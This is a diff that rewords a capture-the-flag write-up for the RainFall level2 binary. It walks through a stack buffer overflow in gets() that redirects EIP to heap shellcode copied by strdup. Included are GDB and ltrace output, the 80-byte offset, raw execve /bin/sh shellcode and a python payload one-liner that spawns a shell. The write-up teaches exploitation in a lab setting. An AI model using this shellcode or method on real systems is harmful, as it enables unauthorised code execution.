@@ -1,8 +1,8 @@
 # level2
 
-This exercise is complicated.
+This exercise is more complicated.
 
-First, we extract the C code and do the routine recognition of the binary.
+First, we decompile the C code and perform the initial analysis of the binary.
 
 The code structure is as follows:
 ```c
@@ -35,10 +35,10 @@ We have a function `p` that checks:
 ```c
 if ((unaff_retaddr & 0xb0000000) == 0xb0000000)
 ```
-So we cannot do a direct function call back to stack memory.
+This check prevents a direct jump back to stack memory (which typically begins with `0xb`).
 
-Next, we have a `puts` and a `strdup`.
-The `strdup` is the key. It duplicates our input onto the heap. This allows us to execute shellcode from the heap. Let's do the assembly recognition with GDB:
+However, the program subsequently calls `puts` and `strdup`.
+The call to `strdup` is key. It duplicates our input onto the heap. This allows us to execute shellcode from the heap instead of the stack. Let's inspect the disassembly of the functions using GDB:
 
 ```text
 (gdb) info functions
@@ -97,25 +97,25 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
-As we can see, the `p` function is correct and matches the C code. We can see the `cmp` and the following write to memory by `strdup`.
+The disassembled assembly code of `p` matches the C structure. We can observe the filter check (`cmp`) and the subsequent memory allocation via `strdup`.
 
-We need to overwrite the EIP with a memory address. The program copies our input to the heap via `strdup`. So we can store our shellcode in the heap, and then overwrite EIP to point to the heap address. When the function returns, it will jump to the heap and execute our shellcode.
+To exploit this, we want to overwrite the saved return address (EIP) with the address of our shellcode. Since the program duplicates our input to the heap using `strdup`, we can place our shellcode inside the input buffer, let `strdup` copy it to the heap, and then redirect EIP to point to this heap address. When the function returns, execution will jump to the heap and run the shellcode.
 
-To do this, we need to know where `strdup` writes our input to the heap.
+We first need to determine the heap address where `strdup` duplicates our input buffer.
 
 ### Q&A
 
-* **Are there two buffer overflows?**
-  No. The heap copy is completely legal; we are just saving the shellcode there with a known starting address to then pass to EIP.
-* **Where does the overflow happen?**
-  In `gets`. There we are overflowing until we reach the saved return address (EIP) and replace it with our heap address.
-* **Why are we searching for the address?**
-  We do two things at the same time: our friend `strdup` puts our input somewhere safe on the heap, and our input overflows the EIP so it points to that "somewhere," redirecting the program to our shellcode.
+* **Are we performing two buffer overflows?**
+  No. The heap copy performed by `strdup` is entirely legitimate. We use it to store our shellcode at a predictable heap address, which we then pass to EIP.
+* **Where does the overflow occur?**
+  The overflow occurs in `gets()`, where we write past the stack buffer until we reach and overwrite the saved return address (EIP) with the address of our heap buffer.
+* **Why do we need the heap address?**
+  We are executing two steps simultaneously: `strdup` copies our input containing the shellcode to a stable heap location, and our stack overflow redirects EIP to point to that heap location so the program branches to the shellcode upon return.
 
 ### Finding the Heap Address
 
-There are two ways to get the address:
-1. **The easy way:** running `ltrace` on the binary to see where the string goes:
+There are two ways to retrieve this address:
+1. **Using `ltrace`:** Run the binary with `ltrace` to track the heap allocation of `strdup`:
    ```bash
    level2@RainFall:~$ ltrace ./level2
    __libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
@@ -125,8 +125,7 @@ There are two ways to get the address:
    strdup("")                                                      = 0x0804a008
    +++ exited (status 8) +++
    ```
-2. **The second way:** debugging the stack in real-time in GDB:
-   We place a breakpoint right after `strdup` (before `leave` at `0x0804853d`) and inspect the registers:
+2. **Using GDB:** We place a breakpoint right after `strdup` (before `leave` at `0x0804853d`) and inspect the registers:
    ```text
    (gdb) break *0x0804853d
    (gdb) run
@@ -137,41 +136,41 @@ There are two ways to get the address:
    (gdb) info registers
    eax            0x804a008	134520840
    ```
-   We can see that `eax` (which holds the return value of `strdup`) is `0x0804a008`.
+   The return value in `eax` confirms the allocated heap address is `0x0804a008`.
 
 ### Finding the Offset
 
-We need to know how many bytes are between our input buffer and the saved return address. We will use a 200-character pattern to test:
+To find the number of bytes required to reach the saved return address, we supply a 200-character test pattern:
 `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`
 
-We run the program inside GDB and input the pattern:
+We run the program inside GDB and feed the pattern:
 ```text
 Program received signal SIGSEGV, Segmentation fault.
 0x37634136 in ?? ()
 (gdb) info registers eip
 eip            0x37634136	0x37634136
 ```
-Checking the pattern offset for `0x37634136` (which is `6Ac7` in ASCII), the offset is exactly **80** bytes.
+The crash occurs at address `0x37634136` (which corresponds to `6Ac7` in ASCII), pointing to an offset of exactly **80** bytes.
 
 ### Exploit Code
 
 We will use a standard 21-byte shellcode:
 `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
 
-So, we calculate the padding:
+Padding calculation:
 `80 (offset) - 21 (shellcode) = 59` bytes of padding.
 
-Let's build the python command (using `[::-1]` to reverse the target heap address to little-endian):
+We construct our exploit command (using `[::-1]` to write the target heap address in little-endian format):
 ```bash
 python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\x04\xa0\x08"[::-1]' > payload
 ```
 
-And finally, we execute the exploit keeping stdin open:
+And finally, we execute the exploit, keeping the stdin stream open:
 ```bash
 (cat payload; cat) | ./level2
 ```
 
-We get the shell:
+We obtain our shell and read the password for `level3`:
 ```bash
 cd ..
 cd level3
